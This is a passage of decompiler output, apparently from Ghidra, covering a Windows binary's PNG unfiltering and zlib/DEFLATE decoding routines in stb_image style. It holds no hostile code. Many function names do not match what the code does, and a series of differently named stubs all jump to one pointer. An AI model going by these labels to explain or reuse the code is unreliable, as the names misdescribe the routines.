                         (*(byte *)((longlong)_Memory + sVar11 + uVar8) >> 1) + param_2[sVar11 + 1];
                    sVar11 = sVar11 + 1;
                  } while (sVar11 != _Size_00);
                }
                sVar11 = _Size_00;
                iVar26 = local_80;
                while (iVar26 < iVar19) {
                  *(byte *)((longlong)_Dst + sVar11) =
                       (char)((int)((uint)*(byte *)((longlong)_Dst + (sVar11 - _Size_00)) +
                                   (uint)*(byte *)((longlong)_Memory + sVar11 + uVar8)) >> 1) +
                       param_2[sVar11 + 1];
                  sVar11 = sVar11 + 1;
                  iVar26 = (int)sVar11;
                }
                break;
              case 4:
                sVar11 = 0;
                if (local_80 != 0) {
                  do {
                    *(byte *)((longlong)_Dst + sVar11) =
                         *(char *)((longlong)_Memory + sVar11 + uVar8) + param_2[sVar11 + 1];
                    sVar11 = sVar11 + 1;
                  } while (sVar11 != _Size_00);
                }
                sVar11 = _Size_00;
                if (iVar19 <= local_80) break;
                do {
                  bVar24 = *(byte *)((longlong)_Memory + sVar11 + uVar8);
                  bVar4 = *(byte *)((longlong)_Dst + sVar11 + -_Size_00);
                  bVar22 = *(byte *)((longlong)_Memory + sVar11 + -_Size_00 + (ulonglong)uVar8);
                  iVar26 = ((uint)bVar22 + (uint)bVar22 * 2) - ((uint)bVar4 + (uint)bVar24);
                  uVar23 = (uint)bVar4;
                  uVar17 = (uint)bVar24;
                  if (uVar23 <= bVar24) {
                    uVar17 = uVar23;
                  }
                  if (uVar23 < bVar24) {
                    bVar4 = bVar24;
                  }
                  uVar23 = (uint)bVar22;
                  if ((int)(uint)bVar4 <= iVar26) {
                    uVar23 = uVar17;
                  }
                  bVar24 = (byte)uVar23;
                  if (iVar26 <= (int)uVar17) {
                    bVar24 = bVar4;
                  }
                  *(byte *)((longlong)_Dst + sVar11) = bVar24 + param_2[sVar11 + 1];
                  sVar11 = sVar11 + 1;
                } while ((int)sVar11 < iVar19);
                goto joined_r0x000140002174;
              case 5:
                _Dst = (uint *)memcpy(_Dst,pbVar1,_Size_00);
                if (local_80 < iVar19) {
                  sVar11 = _Size_00;
                  do {
                    *(byte *)((longlong)_Dst + sVar11) =
                         (*(byte *)((longlong)_Dst + (sVar11 - _Size_00)) >> 1) +
                         param_2[sVar11 + 1];
                    sVar11 = sVar11 + 1;
                  } while ((int)sVar11 < iVar19);
                }
              }
joined_r0x000140002174:
              param_2 = param_2 + _Size + 1;
              if (param_7 < 8) {
                bVar24 = 1;
                if (param_8 == 0) {
                  bVar24 = (&DAT_14002b430)[param_7];
                }
                if (param_7 == 4) {
                  uVar12 = 0;
                  uVar8 = 0;
                  if (uVar6 != 0) {
                    do {
                      if ((uVar12 & 1) == 0) {
                        uVar8 = (uint)(byte)*_Dst;
                        _Dst = (uint *)((longlong)_Dst + 1);
                      }
                      *(byte *)((longlong)_Dst_00 + uVar12) = ((byte)uVar8 >> 4) * bVar24;
                      uVar12 = uVar12 + 1;
                      uVar8 = uVar8 << 4;
                    } while (uVar12 != uVar6);
                  }
                }
                else if (param_7 == 2) {
                  if (uVar6 != 0) {
                    uVar12 = 0;
                    uVar8 = 0;
                    do {
                      if ((uVar12 & 3) == 0) {
                        uVar8 = (uint)(byte)*_Dst;
                        _Dst = (uint *)((longlong)_Dst + 1);
                      }
                      *(byte *)((longlong)_Dst_00 + uVar12) = ((byte)uVar8 >> 6) * bVar24;
                      uVar12 = uVar12 + 1;
                      uVar8 = uVar8 << 2;
                    } while (uVar6 != uVar12);
                  }
                }
                else {
                  if (param_7 != 1) goto LAB_1400027e4;
                  uVar12 = 0;
                  bVar22 = 0;
                  if (uVar6 != 0) {
                    do {
                      if ((uVar12 & 7) == 0) {
                        bVar22 = (byte)*_Dst;
                        _Dst = (uint *)((longlong)_Dst + 1);
                      }
                      *(byte *)((longlong)_Dst_00 + uVar12) = (char)bVar22 >> 7 & bVar24;
                      uVar12 = uVar12 + 1;
                      bVar22 = bVar22 * '\x02';
                    } while (uVar6 != uVar12);
                  }
                }
                if (param_4 != iVar5) {
                  stbi_build_huffman((longlong)_Dst_00,(longlong)_Dst_00,param_5,iVar5);
                }
              }
              else if (param_7 == 8) {
                if (param_4 == iVar5) {
                  memcpy(_Dst_00,_Dst,(ulonglong)uVar6);
                }
                else {
                  stbi_build_huffman((longlong)_Dst_00,(longlong)_Dst,param_5,iVar5);
                }
              }
              else if (param_7 == 0x10) {
                if (param_4 == iVar5) {
                  if (uVar6 != 0) {
                    lVar13 = 0;
                    do {
                      *(ushort *)((longlong)_Dst_00 + lVar13) =
                           *(ushort *)((longlong)_Dst + lVar13) << 8 |
                           *(ushort *)((longlong)_Dst + lVar13) >> 8;
                      lVar13 = lVar13 + 2;
                    } while ((ulonglong)uVar6 * 2 != lVar13);
                  }
                }
                else {
                  if (iVar5 + 1 != param_4) goto LAB_140002818;
                  if (iVar5 == 1) {
                    if (param_5 != 0) {
                      puVar3 = (uint *)((longlong)_Dst + (ulonglong)param_5 * 2);
                      do {
                        uVar8 = *_Dst;
                        _Dst = (uint *)((longlong)_Dst + 2);
                        *(undefined2 *)((longlong)_Dst_00 + 2) = 0xffff;
                        *(ushort *)_Dst_00 = (ushort)uVar8 << 8 | (ushort)uVar8 >> 8;
                        _Dst_00 = _Dst_00 + 1;
                      } while (_Dst != puVar3);
                    }
                  }
                  else {
                    if (iVar5 != 3) goto LAB_1400027fe;
                    puVar3 = _Dst_00 + (ulonglong)param_5 * 2;
                    if (param_5 != 0) {
                      do {
                        uVar8 = *_Dst;
                        puVar2 = _Dst + 1;
                        puVar18 = _Dst_00 + 2;
                        _Dst = (uint *)((longlong)_Dst + 6);
                        auVar27 = psllw(ZEXT416(uVar8),8);
                        *(ushort *)(_Dst_00 + 1) = (ushort)*puVar2 << 8 | (ushort)*puVar2 >> 8;
                        *(undefined2 *)((longlong)_Dst_00 + 6) = 0xffff;
                        *_Dst_00 = CONCAT22((ushort)(uVar8 >> 0x18),(ushort)uVar8 >> 8) |
                                   auVar27._0_4_;
                        _Dst_00 = puVar18;
                      } while (puVar18 != puVar3);
                    }
                  }
                }
              }
              uVar21 = uVar21 + 1;
              uVar25 = uVar25 + param_4 * param_5 * iVar20;
              if (param_6 == uVar21) goto LAB_140002728;
              pvVar9 = (void *)param_1[3];
            } while( true );
          }
          goto LAB_1400027af;
        }
      }
    }
LAB_140001eb0:
    puVar10 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
    *puVar10 = "too large";
  }
  return 0;
}



/* stbi_compute_transparency @ 140002840 */

int stbi_compute_transparency(longlong param_1)

{
  byte bVar1;
  byte *pbVar2;
  int iVar3;
  byte *pbVar4;
  byte *pbVar5;
  
  pbVar2 = *(byte **)(param_1 + 0xc0);
  pbVar5 = *(byte **)(param_1 + 200);
  if (pbVar2 < pbVar5) {
    pbVar4 = pbVar2 + 1;
    *(byte **)(param_1 + 0xc0) = pbVar4;
    bVar1 = *pbVar2;
  }
  else {
    if (*(int *)(param_1 + 0x30) == 0) {
      return 0;
    }
    FUN_140001480(param_1);
    pbVar2 = *(byte **)(param_1 + 0xc0);
    pbVar5 = *(byte **)(param_1 + 200);
    pbVar4 = pbVar2 + 1;
    *(byte **)(param_1 + 0xc0) = pbVar4;
    bVar1 = *pbVar2;
  }
  iVar3 = (uint)bVar1 * 0x100;
  if (pbVar5 <= pbVar4) {
    if (*(int *)(param_1 + 0x30) == 0) {
      return iVar3;
    }
    FUN_140001480(param_1);
    pbVar2 = *(byte **)(param_1 + 0xc0);
    *(byte **)(param_1 + 0xc0) = pbVar2 + 1;
    return iVar3 + (uint)*pbVar2;
  }
  *(byte **)(param_1 + 0xc0) = pbVar4 + 1;
  return iVar3 + (uint)*pbVar4;
}



/* stbi_defilter_row @ 140002900 */

int stbi_defilter_row(longlong param_1)

{
  byte bVar1;
  byte *pbVar2;
  byte *pbVar3;
  int iVar4;
  int iVar5;
  byte *pbVar6;
  
  pbVar3 = *(byte **)(param_1 + 0xc0);
  pbVar6 = *(byte **)(param_1 + 200);
  if (pbVar3 < pbVar6) {
    pbVar2 = pbVar3 + 1;
    *(byte **)(param_1 + 0xc0) = pbVar2;
    bVar1 = *pbVar3;
    iVar5 = (uint)bVar1 << 8;
    if (pbVar6 <= pbVar2) goto LAB_1400029eb;
LAB_140002960:
    pbVar3 = pbVar2 + 1;
    *(byte **)(param_1 + 0xc0) = pbVar3;
    iVar5 = ((uint)*pbVar2 + iVar5) * 0x10000;
    if (pbVar6 <= pbVar3) goto LAB_140002a28;
LAB_14000297c:
    pbVar2 = pbVar3 + 1;
    *(byte **)(param_1 + 0xc0) = pbVar2;
    iVar4 = (uint)*pbVar3 << 8;
    if (pbVar2 < pbVar6) goto LAB_140002996;
LAB_140002a63:
    if (*(int *)(param_1 + 0x30) != 0) {
      FUN_140001480(param_1);
      pbVar2 = *(byte **)(param_1 + 0xc0);
LAB_140002996:
      *(byte **)(param_1 + 0xc0) = pbVar2 + 1;
      return iVar4 + (uint)*pbVar2 + iVar5;
    }
  }
  else {
    iVar5 = 0;
    if (*(int *)(param_1 + 0x30) != 0) {
      FUN_140001480(param_1);
      pbVar3 = *(byte **)(param_1 + 0xc0);
      pbVar6 = *(byte **)(param_1 + 200);
      pbVar2 = pbVar3 + 1;
      *(byte **)(param_1 + 0xc0) = pbVar2;
      bVar1 = *pbVar3;
      iVar5 = (uint)bVar1 << 8;
      if (pbVar2 < pbVar6) goto LAB_140002960;
LAB_1400029eb:
      if (*(int *)(param_1 + 0x30) == 0) {
        iVar5 = (uint)bVar1 << 0x18;
      }
      else {
        FUN_140001480(param_1);
        pbVar2 = *(byte **)(param_1 + 0xc0);
        pbVar6 = *(byte **)(param_1 + 200);
        pbVar3 = pbVar2 + 1;
        *(byte **)(param_1 + 0xc0) = pbVar3;
        iVar5 = ((uint)*pbVar2 + iVar5) * 0x10000;
        if (pbVar3 < pbVar6) goto LAB_14000297c;
LAB_140002a28:
        if (*(int *)(param_1 + 0x30) != 0) {
          FUN_140001480(param_1);
          pbVar3 = *(byte **)(param_1 + 0xc0);
          pbVar2 = pbVar3 + 1;
          *(byte **)(param_1 + 0xc0) = pbVar2;
          iVar4 = (uint)*pbVar3 << 8;
          if (pbVar2 < *(byte **)(param_1 + 200)) goto LAB_140002996;
          goto LAB_140002a63;
        }
      }
    }
    iVar4 = 0;
  }
  return iVar4 + iVar5;
}



/* stbi_expand_palette @ 140002a90 */

undefined8 stbi_expand_palette(ulonglong *param_1)

{
  ulonglong uVar1;
  int iVar2;
  undefined8 uVar3;
  undefined8 *puVar4;
  int iVar5;
  longlong lVar6;
  byte *pbVar7;
  ulonglong uVar8;
  uint uVar9;
  uint uVar10;
  int iVar11;
  longlong *plVar12;
  longlong lVar13;
  int iVar14;
  undefined1 local_a28 [15];
  undefined4 uStack_a19;
  undefined8 uStack_a10;
  byte local_a08 [8];
  undefined1 local_a00 [456];
  undefined8 local_838 [255];
  
  iVar2 = (int)param_1[2];
  if (iVar2 < 5) {
    stbi_inflate_main((longlong *)param_1);
    iVar2 = (int)param_1[2];
  }
  uVar8 = param_1[3];
  iVar2 = iVar2 + -5;
  *(int *)(param_1 + 2) = iVar2;
  uVar10 = (uint)uVar8 >> 5;
  *(uint *)(param_1 + 3) = uVar10;
  if (iVar2 < 5) {
    stbi_inflate_main((longlong *)param_1);
    uVar10 = (uint)param_1[3];
    iVar2 = (int)param_1[2];
  }
  iVar2 = iVar2 + -5;
  uVar9 = uVar10 >> 5;
  *(int *)(param_1 + 2) = iVar2;
  *(uint *)(param_1 + 3) = uVar9;
  if (iVar2 < 4) {
    stbi_inflate_main((longlong *)param_1);
    uVar9 = (uint)param_1[3];
    iVar2 = (int)param_1[2];
  }
  iVar2 = iVar2 + -4;
  lVar13 = 0;
  *(int *)(param_1 + 2) = iVar2;
  local_a28 = SUB1615((undefined1  [16])0x0,0);
  *(uint *)(param_1 + 3) = uVar9 >> 4;
  uStack_a19 = 0;
  do {
    if (iVar2 < 3) {
      stbi_inflate_main((longlong *)param_1);
      iVar2 = (int)param_1[2];
    }
    uVar1 = param_1[3];
    iVar2 = iVar2 + -3;
    *(int *)(param_1 + 2) = iVar2;
    *(uint *)(param_1 + 3) = (uint)uVar1 >> 3;
    pbVar7 = &DAT_14002b410 + lVar13;
    lVar13 = lVar13 + 1;
    local_a28[*pbVar7] = (byte)(uint)uVar1 & 7;
  } while ((int)lVar13 < (int)((uVar9 & 0xf) + 4));
  uVar3 = stbi_parse_uncompressed_block(local_838,local_a28,0x13);
  if ((int)uVar3 != 0) {
    iVar14 = 0;
    iVar2 = (uVar10 & 0x1f) + 1;
    uVar10 = ((uint)uVar8 & 0x1f) + 0x101;
    iVar11 = uVar10 + iVar2;
    do {
      while( true ) {
        uVar9 = stbi_inflate_block(param_1,(longlong)local_838);
        if (0x12 < uVar9) goto LAB_140002c8a;
        if ((int)uVar9 < 0x10) break;
        iVar5 = (int)param_1[2];
        if (uVar9 == 0x10) {
          if (iVar5 < 2) {
            stbi_inflate_main((longlong *)param_1);
            iVar5 = (int)param_1[2];
          }
          uVar9 = ((uint)param_1[3] & 3) + 3;
          *(uint *)(param_1 + 3) = (uint)param_1[3] >> 2;
          *(int *)(param_1 + 2) = iVar5 + -2;
          if (iVar14 == 0) goto LAB_140002c8a;
          uVar8 = (ulonglong)local_a08[iVar14 + -1];
        }
        else if (uVar9 == 0x11) {
          if (iVar5 < 3) {
            stbi_inflate_main((longlong *)param_1);
            iVar5 = (int)param_1[2];
          }
          uVar9 = ((uint)param_1[3] & 7) + 3;
          *(uint *)(param_1 + 3) = (uint)param_1[3] >> 3;
          *(int *)(param_1 + 2) = iVar5 + -3;
          uVar8 = 0;
        }
        else {
          if (iVar5 < 7) {
            stbi_inflate_main((longlong *)param_1);
            iVar5 = (int)param_1[2];
          }
          uVar9 = ((uint)param_1[3] & 0x7f) + 0xb;
          *(uint *)(param_1 + 3) = (uint)param_1[3] >> 7;
          *(int *)(param_1 + 2) = iVar5 + -7;
          uVar8 = 0;
        }
        if (iVar11 - iVar14 < (int)uVar9) goto LAB_140002c8a;
        lVar6 = (longlong)iVar14;
        lVar13 = uVar8 * 0x101010101010101;
        pbVar7 = local_a08 + lVar6;
        if (uVar9 < 8) {
          if ((uVar9 & 4) == 0) {
            if ((uVar9 != 0) && (*pbVar7 = (byte)lVar13, (uVar9 & 2) != 0)) {
              *(short *)(local_a08 + (ulonglong)uVar9 + lVar6 + -2) = (short)lVar13;
            }
          }
          else {
            *(int *)pbVar7 = (int)lVar13;
            *(int *)(local_a08 + (ulonglong)uVar9 + lVar6 + -4) = (int)lVar13;
          }
        }
        else {
          *(longlong *)pbVar7 = lVar13;
          *(longlong *)((longlong)&uStack_a10 + (ulonglong)uVar9 + lVar6) = lVar13;
          plVar12 = (longlong *)((ulonglong)(local_a00 + lVar6) & 0xfffffffffffffff8);
          for (uVar8 = (ulonglong)
                       (((int)pbVar7 -
                        (int)(longlong *)((ulonglong)(local_a00 + lVar6) & 0xfffffffffffffff8)) +
                        uVar9 >> 3); uVar8 != 0; uVar8 = uVar8 - 1) {
            *plVar12 = lVar13;
            plVar12 = plVar12 + 1;
          }
        }
        iVar14 = iVar14 + uVar9;
        if (iVar11 <= iVar14) goto LAB_140002c84;
      }
      lVar13 = (longlong)iVar14;
      iVar14 = iVar14 + 1;
      local_a08[lVar13] = (byte)uVar9;
    } while (iVar14 < iVar11);
LAB_140002c84:
    if (iVar11 == iVar14) {
      uVar3 = stbi_parse_uncompressed_block((undefined8 *)((longlong)param_1 + 0x3c),local_a08,uVar10);
      if ((int)uVar3 != 0) {
        uVar3 = stbi_parse_uncompressed_block(param_1 + 0x104,local_a08 + uVar10,iVar2);
        return uVar3;
      }
    }
    else {
LAB_140002c8a:
      puVar4 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
      *puVar4 = "bad codelengths";
    }
  }
  return 0;
}



/* stbi_parse_png_file @ 140002e10 */

/* WARNING: Removing unreachable block (ram,0x000140002e53) */

undefined8 stbi_parse_png_file(ulonglong *param_1,int param_2)

{
  byte *pbVar1;
  ulonglong uVar2;
  uint uVar3;
  uint uVar4;
  int iVar5;
  undefined8 uVar6;
  ulonglong uVar7;
  undefined8 *puVar8;
  byte *pbVar9;
  byte bVar10;
  ulonglong uVar11;
  void *_Dst;
  int iVar12;
  uint uVar13;
  void *_Src;
  int iVar14;
  size_t _Size;
  longlong lVar15;
  undefined1 *_Dst_00;
  undefined1 *puVar16;
  byte local_4c [12];
  
  if (param_2 == 0) {
LAB_140002e2b:
    *(undefined4 *)(param_1 + 3) = 0;
    param_1[2] = 0;
    do {
      stbi_inflate_main((longlong *)param_1);
      iVar12 = (int)param_1[2];
      do {
        uVar2 = param_1[3];
        iVar12 = iVar12 + -1;
        *(int *)(param_1 + 2) = iVar12;
        uVar3 = (uint)uVar2 >> 1;
        *(uint *)(param_1 + 3) = uVar3;
        if (iVar12 < 2) {
          stbi_inflate_main((longlong *)param_1);
          uVar3 = (uint)param_1[3];
          iVar12 = (int)param_1[2];
        }
        uVar13 = iVar12 - 2;
        *(uint *)(param_1 + 2) = uVar13;
        *(uint *)(param_1 + 3) = uVar3 >> 2;
        uVar4 = uVar3 & 3;
        if (uVar4 == 0) {
          uVar4 = uVar13 & 7;
          if (uVar4 == 0) {
LAB_14000316d:
            if ((int)uVar13 < 1) {
              if (uVar13 != 0) goto LAB_1400032f0;
              goto LAB_140003362;
            }
LAB_140003175:
            pbVar9 = local_4c;
            uVar3 = uVar13 - 1 >> 3;
            uVar7 = (ulonglong)(uint)param_1[3];
            do {
              uVar11 = uVar7;
              *pbVar9 = (byte)uVar11;
              pbVar9 = pbVar9 + 1;
              uVar7 = uVar11 >> 8;
            } while (pbVar9 != local_4c + (ulonglong)uVar3 + 1);
            *(int *)(param_1 + 3) = (int)(uVar11 >> 8);
            iVar12 = (uVar13 - 8) + uVar3 * -8;
            *(int *)(param_1 + 2) = iVar12;
            if (iVar12 != 0) goto LAB_1400032f0;
            iVar12 = uVar3 + 1;
            if (uVar3 != 3) goto LAB_1400031c2;
          }
          else {
            if ((int)uVar13 < (int)uVar4) {
              stbi_inflate_main((longlong *)param_1);
              *(uint *)(param_1 + 3) = (uint)param_1[3] >> ((byte)uVar4 & 0x1f);
              uVar13 = (int)param_1[2] - uVar4;
              *(uint *)(param_1 + 2) = uVar13;
              goto LAB_14000316d;
            }
            uVar13 = uVar13 - uVar4;
            *(uint *)(param_1 + 3) = (uVar3 >> 2) >> (sbyte)uVar4;
            *(uint *)(param_1 + 2) = uVar13;
            if (uVar13 != 0) goto LAB_140003175;
LAB_140003362:
            iVar12 = 0;
LAB_1400031c2:
            pbVar9 = (byte *)param_1[1];
            lVar15 = (longlong)iVar12;
            do {
              pbVar1 = (byte *)*param_1;
              bVar10 = 0;
              if (pbVar1 < pbVar9) {
                *param_1 = (ulonglong)(pbVar1 + 1);
                bVar10 = *pbVar1;
              }
              local_4c[lVar15] = bVar10;
              lVar15 = lVar15 + 1;
            } while ((int)lVar15 != 4);
          }
          uVar3 = (uint)local_4c[1] * 0x100 + (uint)local_4c[0];
          if ((uint)local_4c[3] * 0x100 + (uint)local_4c[2] != (uVar3 ^ 0xffff)) {
LAB_1400032f0:
            puVar8 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
            *puVar8 = "zlib corrupt";
            return 0;
          }
          _Src = (void *)*param_1;
          _Size = (size_t)(int)uVar3;
          if (param_1[1] < (longlong)_Src + _Size) {
            puVar8 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
            *puVar8 = "read past buffer";
            return 0;
          }
          _Dst = (void *)param_1[4];
          if (param_1[6] < (longlong)_Dst + _Size) {
            uVar6 = stbi_parse_zlib_header((longlong)param_1,(longlong)_Dst,uVar3);
            if ((int)uVar6 == 0) {
              return 0;
            }
            _Src = (void *)*param_1;
            _Dst = (void *)param_1[4];
          }
          memcpy(_Dst,_Src,_Size);
          *param_1 = *param_1 + _Size;
          param_1[4] = param_1[4] + _Size;
        }
        else {
          if (uVar4 == 3) {
            return 0;
          }
          if (uVar4 == 1) {
            uVar6 = stbi_parse_uncompressed_block((undefined8 *)((longlong)param_1 + 0x3c),&DAT_14002b460,0x120);
            if ((int)uVar6 == 0) {
              return 0;
            }
            uVar6 = stbi_parse_uncompressed_block(param_1 + 0x104,&DAT_14002b440,0x20);
            iVar12 = (int)uVar6;
          }
          else {
            uVar6 = stbi_expand_palette(param_1);
            iVar12 = (int)uVar6;
          }
          if (iVar12 == 0) {
            return 0;
          }
          puVar16 = (undefined1 *)param_1[4];
LAB_140002ed0:
          while (uVar3 = stbi_inflate_block(param_1,(longlong)param_1 + 0x3c), (int)uVar3 < 0x100) {
            if (uVar3 == 0xffffffff) goto LAB_140003140;
            if ((undefined1 *)param_1[6] <= puVar16) {
              uVar6 = stbi_parse_zlib_header((longlong)param_1,(longlong)puVar16,1);
              if ((int)uVar6 == 0) {
                return 0;
              }
              puVar16 = (undefined1 *)param_1[4];
            }
            *puVar16 = (char)uVar3;
            puVar16 = puVar16 + 1;
          }
          if (uVar3 != 0x100) {
            if ((int)uVar3 < 0x11e) {
              iVar12 = *(int *)(&DAT_14002b680 + (longlong)(int)(uVar3 - 0x101) * 4);
              uVar3 = *(uint *)(&DAT_14002b700 + (longlong)(int)(uVar3 - 0x101) * 4);
              if (iVar12 != 0) {
                iVar14 = (int)param_1[2];
                if (iVar14 < iVar12) {
                  stbi_inflate_main((longlong *)param_1);
                  iVar14 = (int)param_1[2];
                }
                uVar7 = param_1[3];
                *(int *)(param_1 + 2) = iVar14 - iVar12;
                *(uint *)(param_1 + 3) = (uint)uVar7 >> ((byte)iVar12 & 0x1f);
                uVar3 = uVar3 + ((1 << ((byte)iVar12 & 0x1f)) - 1U & (uint)uVar7);
              }
              uVar4 = stbi_inflate_block(param_1,(longlong)(param_1 + 0x104));
              if (uVar4 < 0x1e) {
                iVar12 = *(int *)(&DAT_14002b580 + (longlong)(int)uVar4 * 4);
                iVar14 = *(int *)(&DAT_14002b600 + (longlong)(int)uVar4 * 4);
                if (iVar12 == 0) {
                  lVar15 = (longlong)iVar14;
                  if ((longlong)((longlong)puVar16 - param_1[5]) < lVar15) {
LAB_1400030ae:
                    puVar8 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
                    *puVar8 = "bad dist";
                    return 0;
                  }
                }
                else {
                  iVar5 = (int)param_1[2];
                  if (iVar5 < iVar12) {
                    stbi_inflate_main((longlong *)param_1);
                    iVar5 = (int)param_1[2];
                  }
                  uVar7 = param_1[3];
                  *(int *)(param_1 + 2) = iVar5 - iVar12;
                  *(uint *)(param_1 + 3) = (uint)uVar7 >> ((byte)iVar12 & 0x1f);
                  iVar14 = iVar14 + ((1 << ((byte)iVar12 & 0x1f)) - 1U & (uint)uVar7);
                  lVar15 = (longlong)iVar14;
                  if ((longlong)((longlong)puVar16 - param_1[5]) < lVar15) goto LAB_1400030ae;
                }
                _Dst_00 = puVar16;
                if ((longlong)(param_1[6] - (longlong)puVar16) < (longlong)(int)uVar3) {
                  uVar6 = stbi_parse_zlib_header((longlong)param_1,(longlong)puVar16,uVar3);
                  if ((int)uVar6 == 0) {
                    return 0;
                  }
                  _Dst_00 = (undefined1 *)param_1[4];
                }
                puVar16 = _Dst_00;
                if (iVar14 == 1) {
                  if (uVar3 != 0) {
                    puVar16 = _Dst_00 + uVar3;
                    memset(_Dst_00,(int)(char)_Dst_00[-lVar15],(ulonglong)uVar3);
                  }
                }
                else if (uVar3 != 0) {
                  uVar7 = 0;
                  do {
                    _Dst_00[uVar7] = (_Dst_00 + -lVar15)[uVar7];
                    uVar7 = uVar7 + 1;
                  } while (uVar3 != uVar7);
                  puVar16 = _Dst_00 + uVar3;
                }
                goto LAB_140002ed0;
              }
            }
LAB_140003140:
            puVar8 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
            *puVar8 = "bad huffman code";
            return 0;
          }
          param_1[4] = (ulonglong)puVar16;
          if ((*(int *)((longlong)param_1 + 0x14) != 0) && ((int)param_1[2] < 0x10)) {
            puVar8 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
            *puVar8 = "unexpected end";
            return 0;
          }
        }
        if (((uint)uVar2 & 1) != 0) {
          return 1;
        }
        iVar12 = (int)param_1[2];
      } while (0 < iVar12);
    } while( true );
  }
  pbVar9 = (byte *)*param_1;
  pbVar1 = (byte *)param_1[1];
  if (pbVar9 < pbVar1) {
    *param_1 = (ulonglong)(pbVar9 + 1);
    bVar10 = *pbVar9;
    if (pbVar9 + 1 < pbVar1) {
      *param_1 = (ulonglong)(pbVar9 + 2);
      if ((pbVar9 + 2 < pbVar1) &&
         (((uint)bVar10 * 0x100 + (uint)pbVar9[1]) * -0x42108421 < 0x8421085)) {
        if ((pbVar9[1] & 0x20) != 0) {
          puVar8 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
          *puVar8 = "no preset dict";
          return 0;
        }
        if ((bVar10 & 0xf) != 8) {
          puVar8 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
          *puVar8 = "bad compression";
          return 0;
        }
        goto LAB_140002e2b;
      }
    }
  }
  puVar8 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
  *puVar8 = "bad zlib header";
  return 0;
}



/* stbi_get8 @ 140003480 */

void stbi_get8(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140003490. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*DAT_14002f040)();
  return;
}



/* stbi_get16be @ 1400034a0 */

void stbi_get16be(void)

{
                    /* WARNING: Could not recover jumptable at 0x0001400034b0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*DAT_14002f040)();
  return;
}



/* stbi_get32be @ 1400034c0 */

void stbi_get32be(void)

{
                    /* WARNING: Could not recover jumptable at 0x0001400034d0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*DAT_14002f040)();
  return;
}



/* stbi_get8_from_callbacks @ 1400034e0 */

void stbi_get8_from_callbacks(void)

{
                    /* WARNING: Could not recover jumptable at 0x0001400034f0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*DAT_14002f040)();
  return;
}



/* stbi_skip_from_callbacks @ 140003500 */

void stbi_skip_from_callbacks(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140003510. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*DAT_14002f040)();
  return;
}



/* stbi_rewind @ 140003520 */

void stbi_rewind(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140003530. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*DAT_14002f040)();
  return;
}



/* stbi_refill_buffer @ 140003540 */

void stbi_refill_buffer(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140003550. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*DAT_14002f040)();
  return;
}



/* stbi_addsizes_valid @ 140003560 */

void stbi_addsizes_valid(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140003570. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*DAT_14002f040)();
  return;
}



/* stbi_mul2sizes_valid @ 140003580 */

void stbi_mul2sizes_valid(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140003590. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*DAT_14002f040)();
  return;
}



/* stbi_mad2sizes_valid @ 1400035a0 */

void stbi_mad2sizes_valid(void)

{
                    /* WARNING: Could not recover jumptable at 0x0001400035b0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*DAT_14002f040)();
  return;
}



/* stbi_mad3sizes_valid @ 1400035c0 */

void stbi_mad3sizes_valid(void)

{
                    /* WARNING: Could not recover jumptable at 0x0001400035d0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*DAT_14002f040)();
  return;
}



/* stbi_mad4sizes_valid @ 1400035e0 */

void stbi_mad4sizes_valid(void)

{
                    /* WARNING: Could not recover jumptable at 0x0001400035f0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*DAT_14002f040)();
  return;
}



/* stbi_malloc_mad2 @ 140003600 */

void stbi_malloc_mad2(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140003610. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*DAT_14002f040)();
  return;
}



/* stbi_malloc_mad3 @ 140003620 */

void stbi_malloc_mad3(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140003630. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*DAT_14002f040)();
  return;
}



/* stbi_malloc_mad4 @ 140003640 */

void stbi_malloc_mad4(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140003650. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*DAT_14002f040)();
  return;
}



/* stbi_check_png_header @ 140003660 */

void stbi_check_png_header(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140003670. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*DAT_14002f040)();
  return;
}



/* stbi_convert_format @ 140003680 */

void stbi_convert_format(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140003690. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*DAT_14002f040)();
  return;
}



/* FUN_1400036a0 @ 1400036a0 */

void FUN_1400036a0(void)

{
                    /* WARNING: Could not recover jumptable at 0x0001400036b0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*DAT_14002f040)();
  return;
}



/* FUN_1400036c0 @ 1400036c0 */

void FUN_1400036c0(void)

{
                    /* WARNING: Could not recover jumptable at 0x0001400036d0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*DAT_14002f040)();
  return;
}



/* FUN_1400036e0 @ 1400036e0 */

void FUN_1400036e0(void)

